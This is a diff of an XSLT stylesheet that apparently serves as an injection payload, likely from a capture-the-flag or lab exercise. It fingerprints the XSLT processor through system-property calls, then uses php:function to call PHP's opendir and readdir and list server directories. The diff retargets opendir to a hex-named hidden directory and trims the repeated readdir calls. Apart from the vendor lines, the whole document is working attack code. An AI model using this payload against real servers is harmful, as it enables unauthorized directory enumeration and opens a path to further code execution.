@@ -10,26 +10,10 @@
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
  
-   EXEC : <xsl:value-of select="php:function('opendir', './')" /> <br />
+   EXEC : <xsl:value-of select="php:function('opendir', './.6ff3200bee785801f420fba826ffcdee')" /> <br />
    
    EXEC : <xsl:value-of select="php:function('readdir')" /> <br />  
-   EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-    EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
-      EXEC : <xsl:value-of select="php:function('readdir')" /> <br />
+  
    
  
  <xsl:if test="system-property('xsl:product-name')">
